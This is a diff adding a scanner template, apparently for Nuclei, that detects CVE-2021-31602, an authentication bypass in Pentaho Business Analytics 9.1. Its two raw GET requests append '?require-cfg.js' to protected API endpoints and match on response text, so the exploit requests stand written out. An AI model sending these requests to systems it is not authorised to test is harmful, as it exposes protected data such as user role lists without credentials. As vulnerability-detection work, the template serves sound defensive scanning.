@@ -1,0 +1,36 @@
+id: cve-2021-31602
+info:
+  name: Pentaho Business Analytics 9.1 Authentication Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Pentaho Business Analytics 9.1 allows authentication bypass by accessing specific API endpoints such as `require-cfg.js` or `require-js-cfg.js`.
+  reference:
+    - https://packetstormsecurity.com/files/164784/Pentaho-Business-Analytics-Pentaho-Business-Server-9.1-Authentication-Bypass.html
+    - https://help.hitachivantara.com/Documentation/Pentaho/9.1
+  classification:
+    cve-id: CVE-2021-31602
+    cvss-score: 9.0
+
+http:
+  - raw:
+      - |
+        GET /pentaho/api/system/executableTypes?require-cfg.js HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "executableFileTypeDtoes"
+        part: body
+
+  - raw:
+      - |
+        GET /pentaho/api/userrolelist/allRoles?require-cfg.js HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "roleList"
+        part: body
